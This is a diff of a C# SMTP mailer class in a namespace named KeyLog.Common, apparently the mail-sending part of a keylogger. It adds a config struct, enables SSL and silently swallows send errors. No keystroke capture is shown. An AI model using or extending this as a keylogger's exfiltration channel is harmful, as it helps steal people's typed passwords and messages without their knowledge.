@@ -1,27 +1,55 @@
 ﻿using System;
 using System.Net;
 using System.Net.Mail;
-using Map = System.Collections.Generic.Dictionary<string, string>;
+using System.Collections.Generic;
 
 
 namespace KeyLog.Common {
   class Smtp {
 
-    SmtpClient  Client;
+    SmtpClient Client;
     public string From;
     public string To;
 
-    public Smtp(Map o) {
-      Client = new SmtpClient(o["host"], int.Parse(o["port"]));
-      Client.Credentials = new NetworkCredential(o["username"], o["password"]);
-      From = o["from"];
-      To = o["to"];
+
+    public Smtp(SmtpConfig c) : this(c.Host, c.Port, c.Username, c.Password) {
+      From = c.From;
+      To   = c.To;
     }
 
+    public Smtp(string host, int port, string username="", string password="") {
+      Client = new SmtpClient(host, port);
+      Client.Credentials = new NetworkCredential(username, password);
+      Client.EnableSsl = true;
+      From = To = "";
+    }
+
+
     public void Send(string subject, string body) {
-      MailMessage m = new MailMessage(From, To, subject, body);
-      try { Client.SendAsync(m, null); }
+      try { Client.SendAsync(From, To, subject, body, null); }
       catch (Exception) {}
+    }
+  }
+
+
+  struct SmtpConfig {
+    public string Host;
+    public int    Port;
+    public string Username;
+    public string Password;
+    public string From;
+    public string To;
+
+    public SmtpConfig(Dictionary<string, string> options, string prefix="") {
+      var o = options;
+      var p = prefix;
+      o.TryGetValue(p+"host", out Host);
+      o.TryGetValue(p+"port", out string port);
+      o.TryGetValue(p+"username", out Username);
+      o.TryGetValue(p+"password", out Password);
+      o.TryGetValue(p+"from", out From);
+      o.TryGetValue(p+"to", out To);
+      int.TryParse(port, out Port);
     }
   }
 }
